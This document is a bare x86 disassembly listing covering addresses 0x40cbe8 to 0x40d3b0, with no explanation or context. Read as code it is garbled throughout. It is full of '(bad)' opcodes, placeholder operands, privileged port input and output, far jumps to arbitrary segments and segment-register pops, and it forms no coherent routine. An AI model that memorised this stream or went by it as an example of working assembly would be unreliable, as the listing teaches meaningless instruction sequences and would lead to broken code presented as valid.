  40cbe8:	add    DWORD PTR [edx+0x4b],esp
  40cbeb:	xchg   ebp,eax
  40cbec:	test   ah,cl
  40cbee:	cmp    eax,0x963e8ab1
  40cbf3:	in     eax,dx
  40cbf4:	mov    cl,BYTE PTR [ebp+0xfe7c84a]
  40cbfa:	jl     0x40cc00
  40cbfc:	add    cl,bl
  40cbfe:	mov    DWORD PTR [eax-0x7146e226],eax
  40cc04:	int    0x8a
  40cc06:	mov    esi,0xab620245
  40cc0b:	pop    esp
  40cc0c:	mov    WORD PTR [esi],ss
  40cc0e:	into   
  40cc0f:	cld    
  40cc10:	out    0x25,eax
  40cc12:	dec    ecx
  40cc13:	add    eax,0x6bd8e700
  40cc18:	fist   WORD PTR [edi]
  40cc1a:	aad    0xe7
  40cc1c:	add    edi,eax
  40cc1e:	fsub   DWORD PTR [edx-0x4e]
  40cc21:	lods   eax,DWORD PTR ds:[esi]
  40cc22:	repnz mov edx,0xe8b2278e
  40cc28:	mov    WORD PTR [edx-0x27],fs
  40cc2b:	jb     0x40cbe8
  40cc2d:	fisub  WORD PTR [edx-0x42ff4905]
  40cc33:	cmp    eax,0x5435f6c4
  40cc38:	jmp    0x6240:0x70dd6d8e
  40cc3f:	inc    ebp
  40cc40:	clc    
  40cc41:	mov    gs,WORD PTR [eax-0x4f]
  40cc44:	push   edx
  40cc45:	dec    esi
  40cc46:	pusha  
  40cc47:	fnstenv [edx-0x32]
  40cc4a:	add    eax,0x6205b2c6
  40cc4f:	or     dl,BYTE PTR [ebx]
  40cc51:	sub    ebp,DWORD PTR [edx-0x29]
  40cc54:	out    0x3,eax
  40cc56:	out    0x15,eax
  40cc58:	int3   
  40cc59:	idiv   DWORD PTR [ebx-0x27]
  40cc5c:	mov    bh,0x9a
  40cc5e:	dec    esi
  40cc5f:	xor    eax,0x5a6243fe
  40cc64:	and    eax,DWORD PTR [edi]
  40cc66:	out    0x24,eax
  40cc68:	in     al,dx
  40cc69:	xor    dh,BYTE PTR [ebx+esi*1]
  40cc6c:	jmp    0x3e8c:0xe444db3c
  40cc73:	sar    edi,1
  40cc75:	or     BYTE PTR [eax-0x5f731825],ah
  40cc7b:	push   ds
  40cc7c:	ds aaa 
  40cc7e:	or     DWORD PTR [eax-0x55],ebx
  40cc81:	lock addr16 (bad) 
  40cc85:	lds    ebx,FWORD PTR [ebp-0x27]
  40cc88:	sbb    eax,0x2d52928d
  40cc8d:	or     BYTE PTR [edx-0x77],bh
  40cc90:	add    BYTE PTR [edx],ah
  40cc92:	fldcw  WORD PTR fs:[edx-0x27]
  40cc96:	add    BYTE PTR [edi-0x27],al
  40cc99:	push   esi
  40cc9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc9b:	jge    0x40ccd7
  40cc9d:	pop    ss
  40cc9e:	sub    DWORD PTR [esi+0x5a],ebx
  40cca1:	(bad)  
  40cca2:	in     eax,0x9b
  40cca4:	call   0xb9ec:0x5b0a6253
  40ccab:	xchg   esi,eax
  40ccac:	daa    
  40ccad:	mov    dh,ah
  40ccaf:	pop    ecx
  40ccb0:	mov    ebp,DWORD PTR es:[edi]
  40ccb3:	push   ds
  40ccb4:	push   ebx
  40ccb5:	pop    esi
  40ccb6:	lods   eax,DWORD PTR ds:[esi]
  40ccb7:	jmp    0x9437c9d0
  40ccbc:	jle    0x40cd06
  40ccbe:	aad    0x58
  40ccc0:	adc    DWORD PTR [ebx+eiz*8+0x23],esi
  40ccc4:	adc    eax,0xd9c6c309
  40ccc9:	(bad)  
  40ccca:	lods   al,BYTE PTR ds:[esi]
  40cccb:	pop    ecx
  40cccc:	xor    DWORD PTR [ebx-0x17],ebp
  40cccf:	jmp    0x4b4c:0xb7fb0944
  40ccd6:	sbb    esi,eax
  40ccd8:	add    dh,dl
  40ccda:	call   0x72421f40
  40ccdf:	(bad)  
  40cce0:	cmp    eax,0x4c61e900
  40cce5:	inc    ebx
  40cce6:	cmp    DWORD PTR [esi-0x6e56b9b4],ecx
  40ccec:	daa    
  40cced:	jmp    0x11a36dd
  40ccf2:	(bad)  
  40ccf3:	ficom  WORD PTR [ebp+edi*8+0x75]
  40ccf7:	scas   al,BYTE PTR es:[edi]
  40ccf8:	mov    esi,0xde00e573
  40ccfd:	xchg   edx,eax
  40ccfe:	push   ebp
  40ccff:	shr    DWORD PTR [ecx-0x11160243],1
  40cd05:	out    0x6a,al
  40cd07:	call   0x13e5bf2
  40cd0c:	test   eax,0x88e8cb4c
  40cd11:	or     al,0x3
  40cd13:	add    BYTE PTR [ebx+eax*1+0x32],dl
  40cd17:	rcl    BYTE PTR [eax-0x6e],0xbf
  40cd1b:	add    al,0x7b
  40cd1d:	out    dx,al
  40cd1e:	mov    esp,ebp
  40cd20:	sub    cl,BYTE PTR [edx]
  40cd22:	push   edi
  40cd23:	push   edi
  40cd24:	rcr    BYTE PTR [edi-0x74],0x4d
  40cd28:	repz dec ebp
  40cd2a:	push   es
  40cd2b:	push   ecx
  40cd2c:	in     al,0xcb
  40cd2e:	or     BYTE PTR [ebx+0x58d3],cl
  40cd34:	dec    ebx
  40cd35:	jno    0x40cd9d
  40cd37:	js     0x40cd84
  40cd39:	fld    DWORD PTR [eax+eax*8+0x75fea70f]
  40cd40:	xchg   DWORD PTR [ebp-0x32],ecx
  40cd43:	(bad)  
  40cd44:	ds popa 
  40cd46:	(bad)  
  40cd47:	jne    0x40cd80
  40cd49:	jno    0x40cd70
  40cd4b:	add    bl,bh
  40cd4d:	fmul   DWORD PTR [ecx-0x12b25cb3]
  40cd53:	call   0x43dbfc
  40cd58:	adc    cl,0x56
  40cd5b:	dec    esi
  40cd5d:	ror    BYTE PTR [ecx-0x2884ff77],1
  40cd63:	add    BYTE PTR [eax],al
  40cd65:	arpl   WORD PTR [esi+esi*2],bx
  40cd68:	add    bl,cl
  40cd6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd6b:	mov    ebp,0x9dd4cd85
  40cd70:	shl    ah,0x2
  40cd73:	enter  0xc3c2,0xd8
  40cd77:	push   ebx
  40cd78:	mov    esi,DWORD PTR [edi+0x38f8e158]
  40cd7e:	jno    0x40cd99
  40cd80:	xor    ch,cl
  40cd82:	or     BYTE PTR [edi+0x57],dl
  40cd85:	bound  esp,QWORD PTR [ebx-0x5616eff1]
  40cd8b:	xchg   ebp,eax
  40cd8c:	je     0x40cdec
  40cd8e:	inc    ebp
  40cd8f:	dec    ecx
  40cd90:	and    al,0x42
  40cd92:	stos   BYTE PTR es:[edi],al
  40cd93:	mov    dh,0xfc
  40cd95:	jge    0x40cd1a
  40cd97:	mov    edi,ebp
  40cd99:	fild   WORD PTR [edi+ecx*1-0x6a751ef8]
  40cda0:	call   0x42800b
  40cda5:	out    dx,eax
  40cda6:	jmp    0x5b8d:0x23932ec
  40cdad:	xchg   BYTE PTR [edi-0x4581bc74],bl
  40cdb3:	xchg   esi,eax
  40cdb4:	adc    al,0xae
  40cdb6:	mov    al,ds:0x4650041
  40cdbb:	inc    eax
  40cdbc:	or     BYTE PTR [edx+0x5547e69e],bl
  40cdc2:	xor    eax,0x1d00ff8b
  40cdc7:	mov    dl,0x82
  40cdc9:	(bad)  
  40cdca:	jp     0x40ce03
  40cdcc:	(bad)  
  40cdcd:	cmp    ah,BYTE PTR [esi-0x7a8d0332]
  40cdd3:	sti    
  40cdd4:	movups xmm5,xmm1
  40cdd7:	pop    esp
  40cdd8:	add    eax,0x1b22bb9
  40cddd:	add    dl,bh
  40cddf:	inc    dl
  40cde1:	add    DWORD PTR [edx+0x36],esp
  40cde4:	lds    esi,FWORD PTR [ebx+0x49]
  40cde7:	test   eax,0x75ef0ef6
  40cdec:	fisttp QWORD PTR [esi]
  40cdee:	mov    ecx,0x5ac6826a
  40cdf3:	inc    edi
  40cdf4:	(bad)  
  40cdf5:	cmp    ah,BYTE PTR [esi]
  40cdf7:	mov    ?,ecx
  40cdf9:	jb     0x40ce08
  40cdfb:	aaa    
  40cdfc:	(bad)  
  40cdfd:	out    0x5a,eax
  40cdff:	fldcw  WORD PTR [ebp-0x58aa9dff]
  40ce05:	ucomiss xmm7,DWORD PTR [esp+ebx*2-0x23da170c]
  40ce0d:	pop    esp
  40ce0e:	fsub   st,st(7)
  40ce11:	add    edi,DWORD PTR [edx+0x78]
  40ce14:	test   eax,0xa7556201
  40ce19:	(bad)  
  40ce1c:	loopne 0x40ce66
  40ce1e:	arpl   cx,bx
  40ce20:	adc    DWORD PTR [eax],eax
  40ce22:	xlat   BYTE PTR ds:[ebx]
  40ce23:	and    al,0xc4
  40ce25:	out    dx,eax
  40ce26:	sbb    cl,BYTE PTR [edi+0x620003e7]
  40ce2c:	push   eax
  40ce2d:	and    esp,eax
  40ce2f:	jno    0x40cde2
  40ce31:	push   0xffffffc1
  40ce33:	arpl   cx,bx
  40ce35:	arpl   bx,ax
  40ce37:	mov    cl,0xde
  40ce39:	(bad)  
  40ce3a:	(bad)  
  40ce3b:	cmp    eax,0x2c966e29
  40ce40:	xor    al,bh
  40ce42:	mov    BYTE PTR [ecx-0x4acc040b],ah
  40ce48:	mov    edx,0x196c37fc
  40ce4d:	call   0x2b97f724
  40ce52:	pop    es
  40ce53:	mov    eax,ds:0x51dfb3ba
  40ce58:	mov    edx,0x195043dc
  40ce5d:	call   0x4cf2e934
  40ce62:	(bad)  
  40ce63:	in     eax,0xba
  40ce65:	push   0x1f
  40ce67:	xchg   ch,ah
  40ce69:	out    0x82,eax
  40ce6b:	fcomp  st(0)
  40ce6d:	xchg   esp,eax
  40ce6e:	repnz dec ebp
  40ce70:	cmp    al,0xf0
  40ce72:	add    DWORD PTR [edi-0x1d],ecx
  40ce75:	jno    0x40cea6
  40ce77:	xchg   dl,cl
  40ce79:	add    BYTE PTR [edx-0x61],ah
  40ce7c:	mov    dl,0xc6
  40ce7e:	push   eax
  40ce7f:	data16 fldl2t 
  40ce82:	lock fmul QWORD PTR [esi]
  40ce85:	and    eax,0xfed4ce01
  40ce8a:	(bad)  
  40ce8b:	out    dx,eax
  40ce8c:	dec    edi
  40ce8d:	push   cs
  40ce8e:	rol    DWORD PTR [eax],0x28
  40ce91:	adc    DWORD PTR [ebx],eax
  40ce93:	jmp    0x7b295b72
  40ce98:	sub    edi,edx
  40ce9a:	add    BYTE PTR [edx+ebp*1-0xb],ah
  40ce9e:	adc    al,0xc1
  40cea0:	sar    BYTE PTR [edx+0x2],1
  40cea3:	jmp    0x3f9e6682
  40cea8:	fwait
  40cea9:	dec    esi
  40ceaa:	jecxz  0x40cee0
  40ceac:	and    dh,cl
  40ceae:	add    BYTE PTR [eax],bh
  40ceb0:	fist   DWORD PTR ds:0xca77f125
  40ceb6:	mov    dh,0x29
  40ceb8:	arpl   WORD PTR [esi-0x18],dx
  40cebb:	add    DWORD PTR [edx-0x17],edx
  40cebe:	dec    eax
  40cebf:	and    DWORD PTR [edx-0x2e],edx
  40cec2:	xor    ch,BYTE PTR [ecx]
  40cec4:	stc    
  40cec5:	push   0x0
  40cec7:	jmp    0xf1b01b2d
  40cecc:	retf   0x8bd6
  40cecf:	fcomp  DWORD PTR [ecx+0x4e]
  40ced2:	call   FWORD PTR [ecx+0x5da84e34]
  40ced8:	popa   
  40ced9:	fld    DWORD PTR [eax]
  40cedb:	sahf   
  40cedc:	fcomp  QWORD PTR [eax]
  40cede:	sub    edx,edi
  40cee0:	stos   BYTE PTR es:[edi],al
  40cee1:	or     DWORD PTR [edx+0x2515d922],ecx
  40cee7:	cmc    
  40cee8:	mul    ah
  40ceea:	dec    esp
  40ceeb:	sti    
  40ceec:	and    ecx,ebx
  40ceee:	mov    DWORD PTR [edi+0xc75465],ebx
  40cef4:	add    BYTE PTR [edi-0x39],al
  40cef7:	mov    dl,BYTE PTR [esi-0x4d]
  40cefa:	ins    DWORD PTR es:[edi],dx
  40cefb:	mov    ds:0x89d5c949,al
  40cf00:	clc    
  40cf01:	inc    eax
  40cf02:	sti    
  40cf03:	or     BYTE PTR [ecx-0xea4689],cl
  40cf09:	aaa    
  40cf0a:	mov    ecx,0x1596ff0d
  40cf0f:	adc    eax,DWORD PTR [eax+0x7b]
  40cf12:	push   eax
  40cf13:	dec    ecx
  40cf14:	and    al,0x7f
  40cf16:	jmp    0xff84:0xc167448b
  40cf1d:	ss stos BYTE PTR es:[edi],al
  40cf1f:	xor    BYTE PTR gs:[esi],dh
  40cf22:	aad    0x0
  40cf24:	push   0x77
  40cf26:	add    eax,0xc5275c88
  40cf2b:	in     eax,0xe8
  40cf2d:	xchg   esp,eax
  40cf2e:	fild   DWORD PTR [eax]
  40cf30:	xor    bh,bl
  40cf32:	add    DWORD PTR [edx-0x42],0xe80b
  40cf39:	push   ebp
  40cf3a:	add    eax,DWORD PTR ds:0x5686e350
  40cf40:	add    bh,BYTE PTR [ebx]
  40cf42:	cmp    DWORD PTR [esi+0x49625374],edi
  40cf48:	and    al,0x1f
  40cf4a:	or     BYTE PTR [edi-0x1],dl
  40cf4d:	aaa    
  40cf4e:	cdq    
  40cf4f:	sbb    eax,0x569aa357
  40cf54:	add    bh,bl
  40cf56:	cmp    BYTE PTR [esi+0x8170074],bh
  40cf5c:	push   eax
  40cf5d:	mov    edi,DWORD PTR [edi+0x76a2198]
  40cf63:	pusha  
  40cf64:	inc    ecx
  40cf65:	and    al,0x5f
  40cf67:	in     eax,dx
  40cf68:	call   0x11be549
  40cf6d:	mov    ah,BYTE PTR [edx-0x16]
  40cf70:	mov    dh,cl
  40cf72:	mov    edx,0x620249eb
  40cf77:	sub    al,0xc1
  40cf79:	pop    esi
  40cf7a:	pop    ds
  40cf7b:	jnp    0x40cfb0
  40cf7d:	pop    ecx
  40cf7e:	mov    al,ds:0x135101ba
  40cf83:	push   ebx
  40cf84:	cs push esi
  40cf86:	(bad)  [ecx-0x35e872c7]
  40cf8c:	cmp    bh,bh
  40cf8e:	outs   dx,DWORD PTR ds:[esi]
  40cf8f:	(bad)  
  40cf90:	idiv   BYTE PTR [edi]
  40cf92:	bound  edi,QWORD PTR [ebx]
  40cf94:	inc    ecx
  40cf95:	and    al,0x3e
  40cf97:	mov    bl,0xae
  40cf99:	mov    ah,BYTE PTR [ebx]
  40cf9b:	mov    esi,0xf86a44ce
  40cfa0:	or     esi,eax
  40cfa2:	es fdivrp st(5),st
  40cfa5:	add    BYTE PTR [ecx-0x4e],bh
  40cfa8:	jle    0x40cfaa
  40cfaa:	cdq    
  40cfab:	std    
  40cfac:	in     al,dx
  40cfad:	push   cs
  40cfae:	fsub   QWORD PTR [ebp-0x7f9dfffc]
  40cfb4:	dec    eax
  40cfb5:	and    al,0x71
  40cfb7:	les    eax,FWORD PTR [eax-0x518c9984]
  40cfbd:	mov    BYTE PTR [eax],al
  40cfbf:	mov    dh,0xa6
  40cfc1:	cmc    
  40cfc2:	cmp    BYTE PTR [ebp-0x52],cl
  40cfc5:	out    dx,eax
  40cfc6:	push   edx
  40cfc7:	and    eax,0xea1491d7
  40cfcc:	mov    bl,0x41
  40cfce:	add    BYTE PTR [edi-0x3c],dl
  40cfd1:	add    al,0x0
  40cfd3:	bound  edx,QWORD PTR [edi-0x3d9d027b]
  40cfd9:	add    edi,edi
  40cfdb:	xor    eax,0x5097f7f7
  40cfe0:	add    BYTE PTR [ecx],0x89
  40cfe3:	dec    ebp
  40cfe4:	call   0x36e7:0xd8e5ffc1
  40cfeb:	fucomp st(5)
  40cfed:	scas   eax,DWORD PTR es:[edi]
  40cfee:	adc    bl,BYTE PTR [esi]
  40cff0:	fst    DWORD PTR [esi]
  40cff2:	stc    
  40cff3:	leave  
  40cff4:	enter  0x3a7,0xd9
  40cff8:	mov    al,0x6c
  40cffa:	xchg   ebx,eax
  40cffb:	ins    BYTE PTR es:[edi],dx
  40cffc:	pop    ebp
  40cffd:	pop    ds
  40cffe:	add    al,0x62
  40d000:	fld    DWORD PTR [ecx-0x3bd35335]
  40d006:	jecxz  0x40d014
  40d008:	mov    eax,0x19742ffc
  40d00d:	call   0xf73df18f
  40d012:	sbb    esp,edx
  40d014:	fsub   st,st(7)
  40d016:	add    ebx,edx
  40d018:	pop    ds
  40d019:	add    BYTE PTR [ecx+0x341b1924],al
  40d01f:	jmp    0x40d068
  40d021:	hlt    
  40d022:	xchg   edx,eax
  40d023:	add    BYTE PTR [esi+0x3d],dl
  40d026:	(bad)  
  40d027:	inc    ebx
  40d028:	bound  esp,QWORD PTR [ebx+edi*1-0x18]
  40d02c:	xchg   ebp,eax
  40d02d:	pop    edx
  40d02e:	mov    ds:0x1b8bdeeb,eax
  40d033:	sub    bl,cl
  40d035:	sbb    eax,0x6e54e7c4
  40d03a:	das    
  40d03b:	cld    
  40d03c:	(bad)  
  40d03d:	pop    esp
  40d03e:	mov    al,0x17
  40d040:	fwait
  40d041:	out    0x3d,al
  40d043:	inc    ebx
  40d044:	pop    ebx
  40d045:	cwde   
  40d046:	mov    bl,bh
  40d048:	mov    edi,0xd50228e2
  40d04d:	jecxz  0x40d03d
  40d04f:	pop    edx
  40d050:	aad    0x60
  40d052:	stos   DWORD PTR es:[edi],eax
  40d053:	out    0x41,eax
  40d055:	shr    DWORD PTR [ebp+0x72d96035],0xbd
  40d05c:	jmp    0x40cfef
  40d05e:	dec    edi
  40d05f:	seto   bl
  40d062:	add    cl,ch
  40d064:	xor    DWORD PTR [ebx],ecx
  40d066:	mov    WORD PTR [esi-0x301f65f],fs
  40d06c:	(bad)  
  40d06d:	iret   
  40d06e:	inc    eax
  40d06f:	jmp    0x6b023fd4
  40d074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d075:	loop   0x40d0a8
  40d077:	xor    cl,BYTE PTR [ecx+0x55b1192d]
  40d07d:	int3   
  40d07e:	push   0xd96169
  40d083:	sbb    BYTE PTR fs:[ecx],bl
  40d086:	push   edx
  40d087:	cdq    
  40d088:	add    al,dl
  40d08a:	int    0x64
  40d08c:	jmp    DWORD PTR [ecx]
  40d08e:	fld    DWORD PTR [ecx+0x8c262a5]
  40d094:	bound  ebx,QWORD PTR [edx]
  40d096:	std    
  40d097:	and    al,0x47
  40d099:	or     DWORD PTR [edi],ebx
  40d09b:	inc    ebx
  40d09c:	jb     0x40d0db
  40d09e:	(bad)  [ecx+0xd8fa70]
  40d0a4:	jmp    0xe9a9b272
  40d0a9:	popa   
  40d0aa:	bound  eax,QWORD PTR [ebx-0x17]
  40d0ad:	fiadd  WORD PTR [edx+0x25]
  40d0b0:	cmc    
  40d0b1:	mov    WORD PTR [eax],cs
  40d0b3:	mov    ah,BYTE PTR [ecx-0x36]
  40d0b6:	fld    DWORD PTR [eax]
  40d0b8:	jmp    0x44831247
  40d0bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0be:	fldcw  WORD PTR [eax-0x17]
  40d0c1:	popa   
  40d0c2:	loope  0x40d0c4
  40d0c4:	xor    DWORD PTR [ebx+0x41],0x75dde901
  40d0cb:	je     0x40d0b9
  40d0cd:	ss xchg ebx,eax
  40d0cf:	inc    ecx
  40d0d0:	push   edx
  40d0d1:	adc    al,0x63
  40d0d3:	int    0x41
  40d0d5:	jo     0x40d0f5
  40d0d7:	add    ebp,ecx
  40d0d9:	mov    BYTE PTR ds:0x48dd0001,dl
  40d0df:	adc    al,0x40
  40d0e1:	sbb    DWORD PTR [edx],ebx
  40d0e3:	add    DWORD PTR [edi-0x2b],ebx
  40d0e6:	push   es
  40d0e7:	mov    eax,ebx
  40d0e9:	rol    BYTE PTR [edx],1
  40d0eb:	pop    eax
  40d0ec:	ret    0xd700
  40d0ef:	fldcw  WORD PTR [edx+0x2c]
  40d0f2:	repz icebp 
  40d0f4:	pop    ss
  40d0f5:	inc    esp
  40d0f6:	mov    ebx,0xb8563351
  40d0fb:	(bad)  [ecx-0x1b31cd0f]
  40d101:	idiv   BYTE PTR [esi-0x44bb8df7]
  40d107:	fidiv  DWORD PTR [ebx+0x37]
  40d10a:	je     0x40d0d5
  40d10c:	je     0x40d152
  40d10e:	mov    esi,eax
  40d110:	std    
  40d111:	adc    eax,0x3daf47
  40d116:	add    edi,eax
  40d118:	lods   eax,DWORD PTR ds:[esi]
  40d119:	je     0x40d15a
  40d11b:	(bad)  
  40d11d:	ret    
  40d11e:	mov    cl,dh
  40d120:	pop    ss
  40d121:	call   0x415948
  40d126:	call   FWORD PTR [ecx-0x4107ef8f]
  40d12c:	mov    cl,0x74
  40d12e:	(bad)  
  40d12f:	fld    QWORD PTR [eax]
  40d131:	adc    BYTE PTR [eax],0xd8
  40d134:	mov    BYTE PTR ds:0x44ccab,bl
  40d13a:	mov    WORD PTR [edx+0x14],cs
  40d13d:	inc    eax
  40d13e:	sbb    DWORD PTR [ecx],ebx
  40d140:	add    DWORD PTR [ebx-0x7302b6a2],eax
  40d146:	jle    0x40d0e9
  40d148:	dec    ebp
  40d149:	call   0x402231
  40d14e:	xchg   esi,eax
  40d14f:	sbb    eax,ebp
  40d151:	push   eax
  40d152:	add    BYTE PTR [ebx+ecx*8+0x1e62e808],dh
  40d159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15a:	add    DWORD PTR [edx+0x39],esp
  40d15d:	or     bl,ch
  40d15f:	outs   dx,DWORD PTR ds:[esi]
  40d160:	scas   eax,DWORD PTR es:[edi]
  40d161:	sar    DWORD PTR [edi],0x21
  40d164:	sub    BYTE PTR [edi],ah
  40d166:	call   0x82e64744
  40d16b:	cmp    al,0xc2
  40d16d:	test   BYTE PTR [esi+ebx*8-0x5],cl
  40d171:	aam    0xbf
  40d173:	fwait
  40d174:	mov    esp,0xdaa29500
  40d179:	xchg   ebx,eax
  40d17a:	push   esp
  40d17b:	popa   
  40d17c:	ret    0x3c3
  40d17f:	bound  ecx,QWORD PTR [eax-0x3]
  40d182:	addr16 jp 0x40d13e
  40d185:	inc    ebp
  40d186:	add    BYTE PTR [edx+0x6203371a],bh
  40d18c:	cmp    DWORD PTR [edi],edi
  40d18e:	in     al,0xe1
  40d190:	and    eax,0xd194ff91
  40d195:	pushf  
  40d196:	or     eax,0xeb01c081
  40d19b:	pop    ebp
  40d19c:	iret   
  40d19d:	les    edi,FWORD PTR [edi]
  40d19f:	mov    eax,ds:0xe1e82827
  40d1a4:	add    eax,0x5d9fe91
  40d1a9:	test   eax,0x99c24282
  40d1ae:	mov    esp,0xc301bfb7
  40d1b3:	enter  0x19c6,0x28
  40d1b7:	add    BYTE PTR [ebx+0x6],ch
  40d1ba:	add    eax,0x1edcfe8
  40d1bf:	add    cl,ah
  40d1c1:	in     al,0x90
  40d1c3:	push   DWORD PTR [ecx+esi*2]
  40d1c6:	cdq    
  40d1c7:	popf   
  40d1c8:	adc    eax,0x58eb01c0
  40d1cd:	outs   dx,DWORD PTR ds:[esi]
  40d1ce:	sar    DWORD PTR [edi],0x21
  40d1d1:	fnstenv [edx+0x29]
  40d1d4:	or     bh,BYTE PTR [edi]
  40d1d6:	sub    BYTE PTR [ebx+ebx*8],0x1d
  40d1da:	dec    esp
  40d1db:	adc    DWORD PTR [esi-0x1163b14b],0xd
  40d1e2:	jmp    0x40d1e7
  40d1e4:	and    DWORD PTR [edi],edi
  40d1e6:	in     al,dx
  40d1e7:	sbb    ecx,DWORD PTR [edx-0x2e]
  40d1ea:	stos   DWORD PTR es:[edi],eax
  40d1eb:	add    edi,edx
  40d1ed:	sbb    eax,0x58620295
  40d1f2:	mov    WORD PTR [edi-0x64274d2b],cs
  40d1f8:	scas   eax,DWORD PTR es:[edi]
  40d1f9:	mov    ebp,ecx
  40d1fb:	add    edi,DWORD PTR [ecx+0x7dc3dade]
  40d201:	cwde   
  40d202:	jb     0x40d22d
  40d204:	retf   0x603e
  40d207:	sub    al,0xdb
  40d209:	sbb    eax,0xb516830c
  40d20e:	out    dx,al
  40d20f:	fwait
  40d210:	ds push cs
  40d212:	jmp    0x40d217
  40d214:	mov    eax,ds:0x5a1c4c3e
  40d219:	shr    BYTE PTR [ebx],cl
  40d21b:	add    al,0x0
  40d21d:	jp     0x40d1ec
  40d21f:	xor    al,0x3
  40d221:	(bad)  
  40d222:	call   0xb52f4ee4
  40d227:	adc    eax,0x1e0b1436
  40d22c:	xlat   BYTE PTR ss:[ebx]
  40d22e:	sbb    eax,0xe95d3364
  40d233:	pop    DWORD PTR [edx]
  40d235:	sub    eax,0xa67ce7d8
  40d23a:	mov    ecx,0xb346406a
  40d23f:	xor    dl,0x70
  40d242:	cdq    
  40d243:	daa    
  40d244:	ret    
  40d245:	call   0xca5a6286
  40d24a:	adc    DWORD PTR [ecx],eax
  40d24c:	pusha  
  40d24d:	call   0x31b3:0xf21c81b9
  40d254:	pop    edi
  40d255:	jmp    0xfdb2:0x78640d72
  40d25c:	jmp    0x644a07e9
  40d261:	in     al,dx
  40d262:	jecxz  0x40d1e8
  40d264:	ja     0x40d2c7
  40d266:	fld    DWORD PTR [eax]
  40d268:	rcr    DWORD PTR [ecx],cl
  40d26a:	or     eax,0x36ea3656
  40d26f:	pop    ss
  40d270:	test   eax,0xf5c45661
  40d275:	jg     0x40d2d5
  40d277:	inc    ebx
  40d278:	xchg   DWORD PTR gs:[eax+0x5],esp
  40d27c:	(bad)
  40d280:	xchg   DWORD PTR [eax],eax
  40d282:	sbb    eax,DWORD PTR ds:[ebx]
  40d285:	(bad)  
  40d286:	cmp    BYTE PTR ds:0x1b2e878d,bl
  40d28c:	add    eax,0x911d288f
  40d291:	xchg   DWORD PTR [esi],ebx
  40d293:	sbb    eax,DWORD PTR [edi]
  40d295:	jb     0x40d2b4
  40d297:	push   ecx
  40d298:	xchg   DWORD PTR [esi],esp
  40d29a:	mov    ds,WORD PTR [edi+0x43]
  40d29d:	jne    0x40d2a8
  40d29f:	sbb    edx,DWORD PTR [ecx]
  40d2a1:	bound  esp,QWORD PTR ds:0x7a2e8779
  40d2a7:	pop    edi
  40d2a8:	inc    ebx
  40d2a9:	test   ecx,ebp
  40d2ab:	sbb    bl,BYTE PTR [ecx]
  40d2ad:	bound  ebx,QWORD PTR ds:0x52268781
  40d2b3:	cmp    al,0x8a
  40d2b5:	sub    al,0xc2
  40d2b7:	cmp    al,0x88
  40d2b9:	es inc esi
  40d2bb:	cmp    al,0x8a
  40d2bd:	sub    al,0xae
  40d2bf:	cmp    al,0x88
  40d2c1:	es inc eax
  40d2c3:	cmp    al,0x8a
  40d2c5:	add    BYTE PTR [esi-0x7b769bef],al
  40d2cb:	shl    DWORD PTR [ebx-0x75],0x76
  40d2cf:	and    eax,0xbb448964
  40d2d4:	arpl   WORD PTR [ebx-0x769bde3a],cx
  40d2da:	les    ecx,FWORD PTR [ebp+0x2e3b458a]
  40d2e0:	inc    edi
  40d2e1:	sub    al,0x80
  40d2e3:	repnz xchg esp,eax
  40d2e5:	test   DWORD PTR [eax],eax
  40d2e7:	xor    dl,cl
  40d2e9:	or     eax,0x4d85c48d
  40d2ee:	push   ecx
  40d2ef:	cmp    cl,BYTE PTR [esi+0xd]
  40d2f2:	push   ecx
  40d2f3:	mov    WORD PTR [edx-0x29f4eda7],gs
  40d2f9:	xor    eax,eax
  40d2fb:	jae    0x40d2c8
  40d2fd:	push   esp
  40d2fe:	add    edi,DWORD PTR [ebx-0x1effe669]
  40d304:	mov    cl,0x65
  40d306:	clc    
  40d307:	ret    
  40d308:	sbb    DWORD PTR [ecx],eax
  40d30a:	call   0x42bcae
  40d30f:	cmp    dl,bh
  40d311:	cld    
  40d312:	add    cl,ah
  40d314:	aad    0xfd
  40d316:	xor    DWORD PTR [ebx+0x7b02e188],esi
  40d31c:	push   eax
  40d31d:	pop    es
  40d31e:	xor    edi,DWORD PTR [ebx+0x268bc215]
  40d324:	push   ebp
  40d325:	addr16 cwde 
  40d327:	inc    ebx
  40d328:	cs inc ebp
  40d32a:	in     al,0xf8
  40d32c:	repnz cld 
  40d32e:	jmp    DWORD PTR [ebx+0x4b035517]
  40d334:	fwait
  40d335:	add    DWORD PTR [eax],eax
  40d337:	jno    0x40d312
  40d339:	push   0x12163e8
  40d33e:	call   0x3711da5
  40d343:	bound  eax,QWORD PTR [ebx+0x27]
  40d346:	cld    
  40d347:	bound  edx,QWORD PTR [edi-0x2e]
  40d34a:	out    0x0,eax
  40d34c:	push   ebx
  40d34d:	dec    esi
  40d34e:	(bad)  
  40d34f:	(bad)  
  40d350:	cmp    DWORD PTR [ebp-0x7c5d4030],edi
  40d356:	js     0x40d3bc
  40d358:	or     cl,BYTE PTR [ebp+0x75db5769]
  40d35e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d35f:	adc    BYTE PTR [edi+0x52e78d06],0x66
  40d366:	add    BYTE PTR [eax],al
  40d368:	and    DWORD PTR [ebp-0x44f59803],ecx
  40d36e:	inc    ebp
  40d36f:	add    dl,bh
  40d371:	cli    
  40d372:	xor    BYTE PTR [ebx],al
  40d374:	bound  esi,QWORD PTR [ebx-0x9b0776d]
  40d37a:	mov    WORD PTR [esi+ebx*2-0x31],?
  40d37e:	push   ss
  40d37f:	or     ch,al
  40d381:	xchg   ecx,eax
  40d382:	cdq    
  40d383:	dec    ecx
  40d384:	fwait
  40d385:	les    eax,FWORD PTR [ecx]
  40d387:	test   DWORD PTR [edx+0x1f8b045a],esp
  40d38d:	xchg   edx,eax
  40d38e:	jp     0x40d390
  40d390:	mov    ecx,0x89ef78b8
  40d395:	mov    esp,0x8322bfd0
  40d39a:	jge    0x40d400
  40d39c:	jp     0x40d3aa
  40d39e:	ins    DWORD PTR es:[edi],dx
  40d39f:	pop    ebp
  40d3a0:	fisttp DWORD PTR ds:0x9e2f82a1
  40d3a6:	mov    DWORD PTR [edx+0x52be8a9c],ecx
  40d3ac:	popa   
  40d3ad:	ret    0xbc3
  40d3b0:	add    BYTE PTR [edx-0x2d],ah
